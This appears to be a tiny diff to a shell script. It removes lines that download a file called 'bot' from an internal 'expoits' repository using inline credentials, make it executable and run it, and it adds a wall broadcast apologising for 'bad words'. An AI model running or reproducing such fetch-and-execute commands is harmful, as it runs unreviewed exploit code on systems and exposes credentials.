@@ -1,3 +1,1 @@
-wget --user admin --password "enterapassword" http://10.3.70.212:8081/repository/expoits/bot
-chmod +x bot
-./bot
+echo "Sorry guys for the bad words" | wall
